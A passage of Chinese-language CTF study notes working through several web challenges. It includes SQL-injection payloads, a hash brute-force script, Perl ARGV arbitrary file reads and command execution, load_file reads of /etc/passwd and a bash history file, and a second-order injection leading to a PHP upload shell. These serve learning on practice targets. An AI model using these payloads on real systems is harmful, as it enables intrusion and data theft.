select count(*) from ctfshow_users where username = '$username' or nickname = '$username'
```

- 这里我输入`aaa\`，就变成了红色部分是username的查询参数

`username='**aaa\' or nickname =**'aaa\'`

- 所以我把aaa改成or指定查询，此时第一个`#`由于在单引号内，被当作字符，第二个`#`被当成注释

`username='**aaa\#' or nickname =**'/**/or(1)#\'`
## 总结

- sql注入还是总结的不够，还需要再学习
# ctfshow web682(js爆破)
## 思路

- 看hint发现是js代码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683171893158-bca9a9ce-f03a-44e3-9175-fa6dad079dc6.png#averageHue=%23fdfdfc&clientId=ub2de2d49-b74c-4&from=paste&height=650&id=u9cd9d111&originHeight=1299&originWidth=1537&originalType=binary&ratio=2&rotation=0&showTitle=false&size=110431&status=done&style=none&taskId=ua402ac8b-05fb-4150-a1a8-11fd278ce6a&title=&width=768.5)

- 这里我想到是爆破了，但是我迷信于随机生成字符，结果一直爆破不出来
- 这个`s2n2su`函数中的`c2n`函数会返回`a-f`的字符，但是我当时想别的字符也有可能，因为会返回0 
- 其实我就可以先拿`a-f 0-9`试
## wp
:::info
itertools 是 Python 标准库中的一个模块，包含了许多用于高效循环迭代的工具函数。
这个模块提供了一些用于生成迭代器的函数，可以帮助你更方便地处理迭代器、组合、排列、笛卡尔积等常见的组合计算问题。

下面是一些常用的 itertools 函数：
count(start=0, step=1)：生成一个无限循环的迭代器，从 start 开始，每次增加 step，可用于产生无限的数字序列。
cycle(iterable)：将一个可迭代对象重复无限次，然后生成一个无限循环的迭代器，可用于反复遍历一个序列。
repeat(elem, n=None)：生成一个重复 elem 元素 n 次的迭代器，如果 n 为 None，则生成一个无限重复的迭代器。
chain(*iterables)：将多个可迭代对象连接成一个迭代器，可用于将多个序列串联起来。
combinations(iterable, r)：生成一个包含所有长度为 r 的组合的迭代器，可用于枚举序列中所有长度为 r 的组合。
permutations(iterable, r=None)：生成一个包含所有长度为 r 的排列的迭代器，如果 r 为 None，则生成包含所有排列的迭代器。
product(*iterables, repeat=1)：生成一个多个可迭代对象的**笛卡尔积**的迭代器，可用于生成多个序列的组合。等等。

- 笛卡尔积就是全排列，每个对象中取一个元素，返回所有可能的情况A*B*C
:::

- 这里学到了`itertools`模块，可以高效的迭代，**不用手动写很多循环**
- 这个代码使用 itertools.product() 函数生成所有可能的由 string 中的字符组合而成的长度为4的组合。
- 这里就相当于写了4个for循环
```python
import itertools
import hashlib

string = "0123456789abcdef"
target_hash = "c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400"

for aaa in itertools.product(string, repeat=4):
    out1 = hashlib.sha256(''.join(aaa).encode('utf-8')).hexdigest()
    if out1 == target_hash:
        print(''.join(aaa))
```

- 后面的就简单了，有个base32加密，直接用python base32解密就行了
```python
import base64
str = 'GVSTMNDGGQ2DSOLBGUZA===='
decode = base64.b32decode(str.encode('utf-8'))
string1 = decode.decode(encoding)
print(string1)
```

- 如果字节串的编码格式未知，可以使用 chardet 库来自动检测字节串的编码格式
```python
import chardet

byte_string = b'\xe4\xbd\xa0\xe5\xa5\xbd'
encoding = chardet.detect(byte_string)['encoding']
string = byte_string.decode(encoding)
print(string)
```
# 攻防世界 i-got-id-200(难度6) perl文件上传
## 思路

- 没有思路，烦死了
## wp
[攻防世界-web-i-got-id-200（perl文件上传+ARGV造成任意文件读取和任意命令执行） - zhengna - 博客园](https://www.cnblogs.com/zhengna/p/13344832.html)

- 都是.pl文件，.pl文件都是用perl编写的网页文件
- 尝试之后发现，文件上传界面，可以把传入的文件中的文件内容打印出来。
- 这就需要很了解这种语言的特性
- 猜测后台代码是
```perl
use strict;
use warnings; 
use CGI;
my $cgi= CGI->new;
if ( $cgi->upload( 'file' ) ) { 
    my $file= $cgi->param( 'file' );
     while ( <$file> ) { print "$_"; }
}
```

- 这段代码使用param()方法获取文件名，用了尖括号符号<>，这表示从文件句柄中读取一行文本并赋值给变量$_。然后，print语句将$_打印到标准输出中。因此，这个while循环会一行一行地读取文件内容，直到文件结尾
:::info
在给定的代码中，使用$cgi->param('file')来获取上传文件的参数值。

1. 如果上传了多个文件，则**$file只会包含列表中的第一个文件名或文件句柄，而其他文件名或文件句柄则会被忽略。 my $file= $cgi->param( 'file' );这个代码返回的是文件内容**

如果需要处理多个文件，使用列表遍历
my [@files ](/files ) = $cgi->param('file'); 
foreach my $file ([@files) ](/files) ) { 
# 处理每个文件
}
:::

- 因此如果我传入第一个文件的内容是`ARGV`，它读的就是参数中的值，因此构造一下参数，就可以了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683686752937-e23d6603-a284-4502-b9c2-1f6048a67af9.png#averageHue=%23f4efef&clientId=u48653028-7dea-4&from=paste&height=567&id=u0b98be5f&originHeight=1134&originWidth=1081&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87237&status=done&style=none&taskId=uc645e10e-51f2-483f-a579-ecd0a732f67&title=&width=540.5)
:::info
/bin/bash表示启用bash命令

-c 选项用于指定要执行的命令
%20是空格，这里表示url的空格
${IFS}是分隔符，默认是\t\n，也就是命令的空格
bash -c ls \|  表示执行ls \ 并用管道(|)把它读到输入流中
:::
## 总结

- `perl`项目的目录位于`/var/www/cgi-bin/`下
- 注意bash命令的使用
# 攻防世界 comment(难度7) git源码补全
## 思路

- 上来有个登录密码的界面，就是让你爆破
- 但是我没看出来
## wp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684052499655-0dea7cee-355f-45c0-a3ec-c87d3b4ae98e.png#averageHue=%231fc3c8&clientId=u9c604c00-420e-4&from=paste&height=288&id=u0866bee5&originHeight=576&originWidth=1181&originalType=binary&ratio=2&rotation=0&showTitle=false&size=15582&status=done&style=none&taskId=u6935c695-112a-435e-9bda-66dc65b6cf9&title=&width=590.5)

- 这种有提示的界面就是爆破，且一般就是数字
- 写个脚本，爆破出来是666
- 扫目录发现是git源码泄露，用Githack下载，但是下载后的源码不全

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684053798952-5d88cc10-27eb-496f-a88b-221e78764b03.png#averageHue=%23292b34&clientId=u9c604c00-420e-4&from=paste&height=369&id=ucc089665&originHeight=738&originWidth=887&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77161&status=done&style=none&taskId=u4d939151-8cc0-431d-9747-9887cd124b8&title=&width=443.5)

- 这里明显write，comment后应该有东西，因为提交的页面抓包是`write`
- 在console处，也可以发现

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684054069979-63002c5b-8437-4c92-93c6-4866ae0fb11d.png#averageHue=%23d2d9d7&clientId=u9c604c00-420e-4&from=paste&height=237&id=u01c6f6f7&originHeight=473&originWidth=1911&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75722&status=done&style=none&taskId=ueab78649-9275-4aa0-bf8b-7ef1470fdff&title=&width=955.5)
### git源码恢复
:::info
git log --reflog 
是 Git 中的一条命令，它可以显示 Git 引用日志，包括**所有分支的提交历史记录**和 HEAD 的更改历史记录。
引用日志只记录本地仓库的更改历史记录，而不记录远程仓库的更改历史记录。因此，如果你需要查看远程仓库的更改历史记录，需要使用其他 Git 命令。
git reset --hard 
**git reset --hard 是 Git 中的一条命令，它可以将当前分支重置为指定的提交**，并丢弃工作目录和暂存区中的任何更改。
当你运行 git reset --hard 命令时，Git 首先将 HEAD 指针移动到指定的提交。这意味着当前分支现在指向指定的提交，之后该提交之后对分支所做的任何更改都不再可用。然后，它将工作目录和暂存区重置为与指定提交时分支状态相匹配的状态。这意味着所有在指定提交后对工作目录或暂存区中的文件所做的更改都将被丢弃，并且文件将被恢复到该提交时的状态
:::

- 运行`git log --reflog`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684054220882-b01d43e7-5b19-4f85-be56-4f712e09cbeb.png#averageHue=%23292b35&clientId=u9c604c00-420e-4&from=paste&height=303&id=u422abd7b&originHeight=605&originWidth=1421&originalType=binary&ratio=2&rotation=0&showTitle=false&size=121731&status=done&style=none&taskId=u54c977aa-82bb-4617-aa90-bd69b214512&title=&width=710.5)

- 这里表示最近的提交是一个合并提交（Merge），它将两个父提交（bfbdf21 和 5556e3a）合并成一个新的提交（e5b2a24）。
- 恢复到这个状态`git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684054677194-216ce875-f790-43ca-906d-93d8a509b901.png#averageHue=%232e3039&clientId=u9c604c00-420e-4&from=paste&height=455&id=u53e33c99&originHeight=910&originWidth=1021&originalType=binary&ratio=2&rotation=0&showTitle=false&size=151477&status=done&style=none&taskId=ufe5f253c-bd24-4ac0-8a38-31450b18213&title=&width=510.5)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684054724128-b9f8cc20-0574-459c-912e-818eb3cc969f.png#averageHue=%232e3039&clientId=u9c604c00-420e-4&from=paste&height=447&id=u0c310889&originHeight=893&originWidth=1070&originalType=binary&ratio=2&rotation=0&showTitle=false&size=148916&status=done&style=none&taskId=u5e7b6e2e-6026-42f8-8321-970d8650955&title=&width=535)

- 这个我就不太懂了，wp说catgory没过滤
- 这里就可以用单引号闭合
```sql
category=1',content=(select database()),/*&content=*/#
```

- 注意这里要多行注释，中间执行不了用括号
- 但是整了一圈发现数据库里没什么东西，而且也不可写，我就没招了
- 查看`/etc/passwd`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684055477182-69395e46-d60b-4612-b9b9-7498374ba416.png#averageHue=%23f4f2f2&clientId=u9c604c00-420e-4&from=paste&height=316&id=ue494eebf&originHeight=632&originWidth=1676&originalType=binary&ratio=2&rotation=0&showTitle=false&size=219680&status=done&style=none&taskId=u5a5b02e9-af81-47f0-9c4c-09d725f93c1&title=&width=838)

- 可以看到www用户使用了bash操作，查看base的历史
```sql
select load_file('/home/www/.bash_history')
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684055599199-5bfdf7ff-1655-47bf-94da-6c0021d0e860.png#averageHue=%23fefdfd&clientId=u9c604c00-420e-4&from=paste&height=326&id=u1c7b4efd&originHeight=651&originWidth=1826&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31208&status=done&style=none&taskId=u12438766-c26d-4100-bda2-1978e07369e&title=&width=913)

- 这里它先cd到`tmp`目录，解压了`html.zip`，又把所有的东西复制到了`/var/www`目录下，此时删除`/var/www/html`下的`.DS_Store`
- 说明之前的`html`目录下有`.DS_Store`
- load_file加载文件，并解密

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684056432492-1871d694-759b-466e-b2d0-ac8795c28f75.png#averageHue=%23fbf9f9&clientId=uf113ce1f-6e32-4&from=paste&height=267&id=u2fe91a4a&originHeight=533&originWidth=2879&originalType=binary&ratio=2&rotation=0&showTitle=false&size=76516&status=done&style=none&taskId=ue40d64a6-a11c-4162-a92e-73aaed4e5fb&title=&width=1439.5)

- load_file加载文件即可
# 攻防世界 filemanager(难度7)
## 思路

- 扫目录看到有源码泄露
- 代码审计，不知道咋做
- (这个时候我刚和dragon研究明白`addslashes`)
## addslashes
![ea8cf6943033e6df86b27eaae7bd3fc.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684230616292-77dc4809-854e-4ad4-9afa-2d1293c744aa.png#averageHue=%237f7f7e&clientId=u9da0a18a-01b1-4&from=paste&height=703&id=u3cb04883&originHeight=1405&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=261105&status=done&style=none&taskId=ue92939d3-bc38-4ccd-b4a6-2e393f57645&title=&width=1316)

- addslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥
- 但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行
- **所以重点关注addslashes后，什么从数据库中取出来了，并放在了SQL语句中，因为这样就可以执行我构造的命令了**
## wp

- 查看源码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684232061472-65af63d3-87ed-4f18-b4ad-25eaa3348456.png#averageHue=%23251f1e&clientId=u9da0a18a-01b1-4&from=paste&height=472&id=u3ec2a865&originHeight=944&originWidth=2332&originalType=binary&ratio=2&rotation=0&showTitle=false&size=173405&status=done&style=none&taskId=uc84e62b4-6582-45d5-804f-565065ff59b&title=&width=1166)

- 发现这里会把存入的扩展名取出来，也就是这个`oldname、extension`是我可以构造的
- 这题显然是`getshell`，关键是我如何把一个后缀改成`.php`
- **后缀相同咋重命名？**
- **除非后缀为空。（卧槽，像是狄大人破案）**
- 显然我可以把上传的文件扩展名构造成空的。但是此时这个文件的文件名是1.txt.txt
- 如果我直接改1.txt.txt--->1.php
- 也就是此时`file_exists('1.txt')`，但是 并不存在`1.txt`的文件
- 所以我需要再上传一个1.txt，此时能过判断，再把`1.txt.txt`改成1.php，此时没有之前的后缀了，就改成功了
## 总结

- 找到`addslashes`后，又取出来放在sql语句中的地方
- 还要很耐心才可以取得最后的flag
# 攻防世界
## 思路

- 我如何获取到nginx的配置文件呢？`/etc/nginx/sites-enabled/site.conf`
- 文件包含，或者读源码
- 现在有输入框，但是测试了没什么反应

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684808269304-f011859c-7cb3-4ada-bd79-941e7bb0d08e.png#averageHue=%23f5f1f0&clientId=uc8dfacbd-8ee9-4&from=paste&height=286&id=u2cb76bf4&originHeight=571&originWidth=1195&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46270&status=done&style=none&taskId=ucba04811-3479-4efa-994c-4f4d53cc89e&title=&width=597.5)

- 有可能是这里么？
